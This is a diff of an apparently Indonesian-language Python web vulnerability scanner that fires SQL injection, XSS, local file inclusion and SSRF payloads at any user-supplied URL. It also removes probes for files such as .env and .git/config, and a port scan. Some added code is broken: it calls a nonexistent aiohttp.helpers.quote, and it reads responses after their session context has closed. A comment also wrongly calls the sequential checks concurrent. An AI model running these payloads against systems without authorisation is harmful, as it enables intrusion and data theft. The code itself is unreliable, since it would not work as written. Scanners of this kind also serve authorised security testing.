@@ -1,243 +1,247 @@
-import requests
+#!/usr/bin/env python3
+import argparse
+import asyncio
+import aiohttp
 import socket
 import sys
-import re
+import logging
+from urllib.parse import urlparse, urljoin
+from typing import List, Dict, Any, Optional
+
 import colorama
-from urllib.parse import urlparse
 from colorama import Fore, Style
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from rich.console import Console
+from rich.table import Table
+from rich.panel import Panel
+from rich.text import Text
 
-# Nonaktifkan peringatan SSL
-requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
-class WebVulnerabilityScanner:
-    def __init__(self, url):
-        """
-        Inisialisasi scanner dengan URL target
-        """
+class AdvancedWebVulnerabilityScanner:
+    """
+    Advanced Web Vulnerability Scanner by SIINCODE
+    Alat canggih untuk mendeteksi kerentanan web dengan scanning asinkron.
+    """
+    def __init__(self, url: str, verbose: bool = False):
         self.url = url.rstrip('/')
-        # Parse URL untuk mendapatkan host dan skema
         self.parsed_url = urlparse(url)
         self.host = self.parsed_url.netloc
         self.scheme = self.parsed_url.scheme
-
-    def send_request(self, url, timeout=5):
-        """
-        Kirim permintaan HTTP dengan penanganan kesalahan
-        """
-        try:
-            return requests.get(
-                url, 
-                timeout=timeout, 
-                verify=False,  # Nonaktifkan verifikasi SSL untuk menghindari kesalahan
-                allow_redirects=True,
-                headers={
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-                }
-            )
-        except requests.RequestException as e:
-            print(f"{Fore.YELLOW}[!] Kesalahan permintaan: {e}{Style.RESET_ALL}")
-            return None
-
-    def check_sqli(self):
-        """
-        Periksa kerentanan SQL Injection dengan beberapa payload
-        """
-        print(f"{Fore.CYAN}[*] Memeriksa kerentanan SQL Injection...{Style.RESET_ALL}")
         
-        # Daftar payload SQL Injection yang berbeda
-        payloads = [
+        # Konfigurasi logging
+        logging.basicConfig(
+            level=logging.DEBUG if verbose else logging.INFO,
+            format='%(asctime)s - %(levelname)s: %(message)s'
+        )
+        self.logger = logging.getLogger(__name__)
+        
+        # Konsol Rich untuk output yang lebih menarik
+        self.console = Console()
+
+    async def create_session(self) -> aiohttp.ClientSession:
+        """
+        Buat sesi klien aiohttp dengan header default.
+        """
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5'
+        }
+        return aiohttp.ClientSession(headers=headers)
+
+    async def check_advanced_vulnerabilities(self, session: aiohttp.ClientSession) -> Dict[str, Any]:
+        """
+        Pemeriksaan kerentanan lanjutan dengan payload yang lebih kompleks.
+        """
+        self.console.print("[bold cyan]Melakukan Pemindaian Kerentanan Lanjutan...[/bold cyan]")
+        
+        vulnerabilities = {
+            'sqli': await self._advanced_sqli_check(session),
+            'xss': await self._advanced_xss_check(session),
+            'lfi': await self._local_file_inclusion_check(session),
+            'ssrf': await self._server_side_request_forgery_check(session)
+        }
+        
+        return vulnerabilities
+
+    async def _advanced_sqli_check(self, session: aiohttp.ClientSession) -> bool:
+        """
+        Pemeriksaan SQL Injection yang lebih canggih.
+        """
+        advanced_payloads = [
             "' OR '1'='1",
             "1' OR '1'='1",
             "1' OR 1=1--+",
-            "' OR 1=1--+",
-            "admin' --"
+            "admin' --",
+            "' UNION SELECT NULL, VERSION(), DATABASE(), USER()--",
+            "' OR 1=1 LIMIT 1--+"
         ]
 
-        for payload in payloads:
-            target = f"{self.url}?id={requests.utils.quote(payload)}"
-            response = self.send_request(target)
+        for payload in advanced_payloads:
+            test_url = f"{self.url}?id={aiohttp.helpers.quote(payload)}"
+            response = await self.send_request(session, test_url)
             
             if response:
-                # Kriteria deteksi yang lebih komprehensif
+                text = await response.text()
                 indicators = [
-                    "mysql error", 
-                    "syntax error", 
-                    "unexpected token", 
-                    "sql syntax", 
-                    "you have an error in your sql syntax"
+                    "mysql error", "syntax error", 
+                    "you have an error in your sql syntax",
+                    "unexpected token", "sql syntax",
+                    "mysql_fetch_array()", "Warning: mysql_"
                 ]
                 
                 for indicator in indicators:
-                    if indicator in response.text.lower():
-                        print(f"{Fore.RED}[!] Potensi SQL Injection ditemukan di: {target}{Style.RESET_ALL}")
+                    if indicator in text.lower():
+                        self.console.print(f"[bold red]Kerentanan SQL Injection Tingkat Lanjut Terdeteksi di: {test_url}[/bold red]")
                         return True
         
-        print(f"{Fore.GREEN}[+] Tidak ditemukan kerentanan SQL Injection{Style.RESET_ALL}")
         return False
 
-    def check_xss(self):
+    async def _advanced_xss_check(self, session: aiohttp.ClientSession) -> bool:
         """
-        Periksa kerentanan Cross-Site Scripting (XSS)
+        Pemeriksaan Cross-Site Scripting (XSS) yang lebih kompleks.
         """
-        print(f"{Fore.CYAN}[*] Memeriksa kerentanan Cross-Site Scripting (XSS)...{Style.RESET_ALL}")
-        
-        # Daftar payload XSS yang berbeda
-        payloads = [
+        advanced_payloads = [
             "<script>alert('XSS')</script>",
             "'\"><script>alert('XSS')</script>",
             "<img src=x onerror=alert('XSS')>",
-            "javascript:alert('XSS')"
+            "javascript:alert('XSS')",
+            "<svg/onload=alert('XSS')>",
+            "'\"><svg/onload=alert('XSS')>"
         ]
 
-        for payload in payloads:
-            # Gunakan parameter yang berbeda
-            test_params = ['q', 'search', 'id', 's']
-            
-            for param in test_params:
-                target = f"{self.url}?{param}={requests.utils.quote(payload)}"
-                response = self.send_request(target)
-                
-                if response and payload in response.text:
-                    print(f"{Fore.RED}[!] Potensi XSS ditemukan di: {target}{Style.RESET_ALL}")
-                    return True
+        test_params = ['q', 'search', 'id', 's', 'query', 'keyword']
         
-        print(f"{Fore.GREEN}[+] Tidak ditemukan kerentanan XSS{Style.RESET_ALL}")
+        for payload in advanced_payloads:
+            for param in test_params:
+                test_url = f"{self.url}?{param}={aiohttp.helpers.quote(payload)}"
+                response = await self.send_request(session, test_url)
+                
+                if response:
+                    text = await response.text()
+                    if payload in text:
+                        self.console.print(f"[bold red]Kerentanan XSS Tingkat Lanjut Terdeteksi di: {test_url}[/bold red]")
+                        return True
+        
         return False
 
-    def check_sensitive_files(self):
+    async def _local_file_inclusion_check(self, session: aiohttp.ClientSession) -> bool:
         """
-        Periksa file sensitif yang mungkin terbuka
+        Pemeriksaan Local File Inclusion (LFI).
         """
-        print(f"{Fore.CYAN}[*] Memeriksa file sensitif...{Style.RESET_ALL}")
-        
-        # Daftar file sensitif yang lebih komprehensif
-        files = [
-            "/robots.txt", 
-            "/.env", 
-            "/config.php", 
-            "/wp-config.php",  # WordPress
-            "/admin", 
-            "/backup",
-            "/.git/config",
-            "/server-status",
-            "/phpinfo.php",
-            "/info.php"
+        lfi_payloads = [
+            "../../../etc/passwd",
+            "../../../../../../etc/passwd",
+            "/etc/passwd",
+            "..%2F..%2F..%2Fetc%2Fpasswd",
+            "php://filter/convert.base64-encode/resource=index.php"
         ]
 
-        found_files = []
-        for file in files:
-            target = f"{self.url}{file}"
-            response = self.send_request(target)
+        for payload in lfi_payloads:
+            test_url = f"{self.url}?page={aiohttp.helpers.quote(payload)}"
+            response = await self.send_request(session, test_url)
             
-            if response and response.status_code == 200:
-                print(f"{Fore.RED}[!] File sensitif ditemukan: {target}{Style.RESET_ALL}")
-                found_files.append(target)
+            if response:
+                text = await response.text()
+                if "root:" in text or "nobody:" in text:
+                    self.console.print(f"[bold red]Kerentanan Local File Inclusion (LFI) Terdeteksi di: {test_url}[/bold red]")
+                    return True
         
-        if not found_files:
-            print(f"{Fore.GREEN}[+] Tidak ada file sensitif yang ditemukan{Style.RESET_ALL}")
-        
-        return found_files
+        return False
 
-    def check_open_ports(self):
+    async def _server_side_request_forgery_check(self, session: aiohttp.ClientSession) -> bool:
         """
-        Periksa port yang terbuka
+        Pemeriksaan Server-Side Request Forgery (SSRF).
         """
-        print(f"{Fore.CYAN}[*] Memindai port yang terbuka...{Style.RESET_ALL}")
-        
-        # Daftar port yang akan dipindai
-        ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 8080]
-        
-        # Port yang dikenal
-        port_names = {
-            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 
-            53: 'DNS', 80: 'HTTP', 110: 'POP3', 143: 'IMAP', 
-            443: 'HTTPS', 445: 'SMB', 3306: 'MySQL', 
-            3389: 'RDP', 8080: 'HTTP Alternatif'
-        }
+        ssrf_payloads = [
+            "http://127.0.0.1",
+            "http://localhost",
+            "file:///etc/passwd",
+            "gopher://localhost"
+        ]
 
-        open_ports = []
-        
-        # Gunakan ThreadPoolExecutor untuk pemindaian port yang lebih cepat
-        with ThreadPoolExecutor(max_workers=20) as executor:
-            # Simpan futures untuk setiap port
-            future_to_port = {
-                executor.submit(self._check_port, self.host, port): port 
-                for port in ports
-            }
+        for payload in ssrf_payloads:
+            test_url = f"{self.url}?url={aiohttp.helpers.quote(payload)}"
+            response = await self.send_request(session, test_url)
             
-            # Proses hasil
-            for future in as_completed(future_to_port):
-                port = future_to_port[future]
-                try:
-                    is_open = future.result()
-                    if is_open:
-                        print(f"{Fore.RED}[!] Port {port} ({port_names.get(port, 'Tidak dikenal')}) terbuka{Style.RESET_ALL}")
-                        open_ports.append(port)
-                except Exception as exc:
-                    print(f"{Fore.YELLOW}[!] Kesalahan saat memeriksa port {port}: {exc}{Style.RESET_ALL}")
+            if response and response.status == 200:
+                text = await response.text()
+                if "root:" in text or "localhost" in text:
+                    self.console.print(f"[bold red]Kerentanan Server-Side Request Forgery (SSRF) Terdeteksi di: {test_url}[/bold red]")
+                    return True
         
-        if not open_ports:
-            print(f"{Fore.GREEN}[+] Tidak ada port yang terbuka{Style.RESET_ALL}")
-        
-        return open_ports
+        return False
 
-    def _check_port(self, host, port, timeout=1):
+    async def send_request(self, session: aiohttp.ClientSession, url: str, timeout: int = 10) -> Optional[aiohttp.ClientResponse]:
         """
-        Metode internal untuk memeriksa satu port
+        Kirim permintaan HTTP asinkron dengan penanganan kesalahan yang lebih baik.
         """
         try:
-            with socket.create_connection((host, port), timeout=timeout):
-                return True
-        except (socket.timeout, ConnectionRefusedError, OSError):
-            return False
+            async with session.get(url, timeout=timeout, ssl=False) as response:
+                return response
+        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
+            self.logger.warning(f"Kesalahan permintaan: {e}")
+            return None
 
-    def run_full_scan(self):
+    async def run_full_scan(self) -> Dict[str, Any]:
         """
-        Jalankan seluruh pemindaian kerentanan
+        Jalankan pemindaian kerentanan komprehensif.
         """
-        print(f"{Fore.CYAN}[*] Memulai pemindaian kerentanan untuk {self.url}{Style.RESET_ALL}")
+        self.console.print(f"[bold cyan]Memulai Pemindaian Kerentanan untuk {self.url}[/bold cyan]")
         
-        results = {
-            'sqli': self.check_sqli(),
-            'xss': self.check_xss(),
-            'sensitive_files': self.check_sensitive_files(),
-            'open_ports': self.check_open_ports()
-        }
+        async with await self.create_session() as session:
+            # Jalankan pemeriksaan kerentanan secara bersamaan
+            advanced_vulnerabilities = await self.check_advanced_vulnerabilities(session)
+
+        # Buat tabel ringkasan dengan panel yang menarik
+        table = Table(title="Hasil Pemindaian Kerentanan Web - SIINCODE")
+        table.add_column("Jenis Kerentanan", style="cyan")
+        table.add_column("Status", style="magenta")
         
-        print(f"\n{Fore.MAGENTA}[RINGKASAN] Hasil Pemindaian:{Style.RESET_ALL}")
-        print(f"SQL Injection: {'Rentan' if results['sqli'] else 'Aman'}")
-        print(f"Cross-Site Scripting: {'Rentan' if results['xss'] else 'Aman'}")
-        print(f"File Sensitif: {len(results['sensitive_files'])} file ditemukan")
-        print(f"Port Terbuka: {len(results['open_ports'])} port")
+        for vulnerability, detected in advanced_vulnerabilities.items():
+            status = "🚨 Rentan" if detected else "✅ Aman"
+            table.add_row(vulnerability.upper(), status)
+
+        panel = Panel(
+            table,
+            title="[bold red]SIINCODE Web Vulnerability Scanner[/bold red]",
+            border_style="bold yellow",
+            expand=False
+        )
+        
+        self.console.print(panel)
+
+        return advanced_vulnerabilities
+
 
 def main():
     """
-    Fungsi utama untuk menjalankan alat
+    Fungsi utama untuk menangani argumen baris perintah dan menjalankan pemindai.
     """
-    print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
-    print(f"{Fore.CYAN}ALAT PEMINDAI KERENTANAN WEB{Style.RESET_ALL}")
-    print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
+    colorama.init(autoreset=True)
     
-    # Tambahkan penanganan argumen baris perintah
-    if len(sys.argv) > 1:
-        url = sys.argv[1]
-    else:
+    parser = argparse.ArgumentParser(description='Pemindai Kerentanan Web Lanjutan - SIINCODE')
+    parser.add_argument('url', nargs='?', help='URL target untuk dipindai')
+    parser.add_argument('-v', '--verbose', action='store_true', help='Aktifkan logging terperinci')
+    
+    args = parser.parse_args()
+    
+    if not args.url:
         url = input(f"{Fore.CYAN}Masukkan URL target (contoh: https://example.com): {Style.RESET_ALL}")
+    else:
+        url = args.url
     
-    # Tambahkan skema http jika tidak ada
     if not url.startswith(('http://', 'https://')):
         url = f'http://{url}'
     
     try:
-        scanner = WebVulnerabilityScanner(url)
-        scanner.run_full_scan()
+        scanner = AdvancedWebVulnerabilityScanner(url, verbose=args.verbose)
+        asyncio.run(scanner.run_full_scan())
+    
     except KeyboardInterrupt:
-        print(f"\n{Fore.YELLOW}[!] Pemindaian dihentikan oleh pengguna.{Style.RESET_ALL}")
+        print(f"\n{Fore.YELLOW}Pemindaian dihentikan oleh pengguna.{Style.RESET_ALL}")
     except Exception as e:
-        print(f"{Fore.RED}[!] Kesalahan fatal: {e}{Style.RESET_ALL}")
+        print(f"{Fore.RED}Kesalahan fatal: {e}{Style.RESET_ALL}")
+
 
 if __name__ == '__main__':
-    # Inisialisasi colorama
-    colorama.init(autoreset=True)
     main()
